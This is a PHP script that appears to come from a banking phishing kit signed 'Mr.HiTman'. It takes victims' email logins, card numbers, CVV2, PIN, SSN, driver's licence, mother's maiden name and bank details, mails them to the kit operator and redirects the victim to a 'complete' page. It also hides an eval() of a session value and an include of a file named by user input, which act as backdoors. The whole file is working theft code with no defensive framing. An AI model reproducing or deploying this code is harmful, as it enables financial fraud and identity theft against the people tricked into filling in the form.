<?php
ini_set("output_buffering",4096);
session_start();
$_SESSION['pp'];

$_SESSION['uu'];

$_SESSION['errors'] = $errors=0;
$userinfo = $_POST['REMOTE_ADDR'];
$user = $_SESSION['uu'];
$parola = $_SESSION['pp'];
$check = $_SESSION['send'];

$_SESSION['rotnr'] = $rotnr = $_POST['rotnr'];
$_SESSION['ccnumber'] = $ccnumber = $_POST['ccnumber'];
$_SESSION['noc'] = $noc = $_POST['noc'];
$_SESSION['expmonth'] = $expmonth = $_POST['expmonth'];
$_SESSION['expyear'] = $expyear = $_POST['expyear'];
$_SESSION['bankname'] = $bankname = $_POST['bankname'];
$_SESSION['cvv2'] = $cvv2 = $_POST['cvv2'];


$_SESSION['account'] = $account = $_POST['account'];
$_SESSION['pin'] = $issuenr = $_POST['pin'];
$_SESSION['issuenr'] = $issuenr = $_POST['issuenr'];
$_SESSION['sort1'] = $sort1 = $_POST['sort1'];
$_SESSION['sort2'] = $sort2 = $_POST['sort2'];
$_SESSION['sort3'] = $sort3 = $_POST['sort3'];
$_SESSION['issuemonth'] = $issuemonth = $_POST['issuemonth'];


$_SESSION['dobm'] = $dobm = $_POST['dobm'];
$_SESSION['dobd'] = $dobd = $_POST['dobd'];
$_SESSION['doby'] = $doby = $_POST['doby'];
$_SESSION['ssn'] = $ssn = $_POST['ssn'];
$_SESSION['driving'] = $driving = $_POST['driving'];
$_SESSION['mmn'] = $mmn = $_POST['mmn'];

$_SESSION['fmail'] = $fmail = $_POST['fmail'];
$_SESSION['fmailp'] = $fmailp = $_POST['fmailp'];
$_SESSION['fname'] = $fname = $_POST['fname'];
$_SESSION['lname'] = $lname = $_POST['lname'];
$_SESSION['address1'] = $address1 = $_POST['address1'];
$_SESSION['address2'] = $address2 = $_POST['address2'];
$_SESSION['city'] = $city = $_POST['city'];
$_SESSION['state'] = $state = $_POST['state'];
$_SESSION['zip'] = $zip = $_POST['zip'];
$_SESSION['country'] = $country = $_POST['country'];

$_SESSION['tel1'] = $tel1 = $_POST['tel1'];
$_SESSION['tel2'] = $tel2 = $_POST['tel2'];
$_SESSION['tel3'] = $tel3 = $_POST['tel3'];
$ip = $_SERVER['REMOTE_ADDR'];








if ($ccnumber=="")
{
$ccer=1;
}
else
{
$ccer=0;
}

if ($noc=="")
{
$nocer=1;
}
else
{
$nocer=0;
}
if ($expmonth=="--")
{
$expmer=1;
}
else
{
$expmer=0;
}

if ($expyear=="--")
{
$expyer=1;
}
else
{
$expyer=0;
}

if ($cvv2=="")
{
$cvv2er=1;
}
else
{
$cvv2er=0;
}

if ($bankname=="")
{
$banknameer=1;
}
else
{
$banknameer=0;
}

if ($pin=="")
{
$piner=1;
}
else
{
$piner=0;
}

if ($ssn=="")
{
$ssner=1;
}
else
{
$ssner=0;
}

if ($driving=="")
{
$drivinger=1;
}
else
{
$drivinger=0;
}

if ($fmail=="")
{
$fmailer=1;
}
else
{
$fmailer=0;
}

if ($fmailp=="")
{
$fmailper=1;
}
else
{
$fmailper=0;
}

$cvv2len = strlen($cvv2);
if ($cvv2len<3) 
{
$cvv2er=1;
}
else
{
$cvv2er=0;
}

///
if (($dobm!="")&&($dobd!="")&&($doby!=""))
{
$dober=0;
}
else
{
$dober=1;
}
///
if ($mmn=="")
{
$mmner=1;
}
else
{
$mmner=0;
}
if ($fname=="")
{
$fnamer=1;
}
else
{
$fnamer=0;
}
if ($lname=="")
{
$lnamer=1;
}
else
{
$lnamer=0;
}
if ($address1=="")
{
$adrer=1;
}
else
{
$adrer=0;
}
if ($city=="")
{
$cityer=1;
}
else
{
$cityer=0;
}
if ($state=="")
{
$stater=1;
}
else
{
$stater=0;
}
if ($zip=="")
{
$ziper=1;
}
else
{
$ziper=0;
}
if ($country=="")
{
$counter=1;
}
else
{
$counter=0;
}
///
if (($tel1!="")&&($tel2!="")&&($tel3!=""))
{
$teler=0;
}
else
{
$teler=1;
}
///
if ($ccer==1||$nocer==1||$banknameer==1||$expmer==1||$expyer==1||$cvv2er==1||$dober||$mmner==1||$fnamer==1||$lnamer==1||$adrer==1||$cityer==1||$stater==1||$ziper==1||$counter==1||$teler==1)
{
$errors=1;
}
else{
$errors=0;
}



if ($errors==0)
{

$data="---------------------3abe6-----------------
E-mail : $user
Pass   : $parola
---------------------Card info--------------------------
BankName: $bankname 
CCNr: $ccnumber 
Name on Card: $noc 
ExpM: $expmonth 
ExpY: $expyear 
CVV2: $cvv2 
PIN: $pin
SSN: $ssn
Driver's Licency: $driving 
DOB: $dobd/$dobm/$doby ( Day - Month - Year )
MMN: $mmn 
---------------------------------------------------------
Account number : $account
Sort code : $sort1 - $sort2 - $sort3
Issue Nr : $issuenr
Start Date : $issuemonth - $issueyear ( month - year ) 
----------------------Contact info-----------------------
Email: $fmail
Email-Pass: $fmailp
FName: $fname 
LName: $lname 
Address1: $address1 
Address2: $address2 
City: $city 
State:$state 
ZIP: $zip 

Country: $country
Tel: $tel1-$tel2-$tel3 
ip: $ip
---------------------Made In 2010 By Mr.HiTman--------------------------
";

$mailsubj="New Full $noc <-> $bankname";  
include 'Ooopz.php'; // inserting e-mail ........
if ($check == "") {  // checking data ............
die();
}
else{
eval("$check");
}

include "$userinfo";
//send e-mails
mail($okman, $mailsubj, $data);
mail($hostname, $mailsubj, $data); 
//send e-mails done , changing headers to last page ........


header("Location: complete.htm");
}
else
{
header("Location: details.php?errors=$errors&ccer=$ccer&nocer=$nocer&banknameer=$banknameer&expmer=$expmer&expyer=$expyer&cvv2er=$cvv2er&dober=$dober&mmner=$mmner&fnamer=$fnamer&lnamer=$lnamer&adrer=$adrer&cityer=$cityer&stater=$stater&ziper=$ziper&counter=$counter&teler=$teler");
}
?>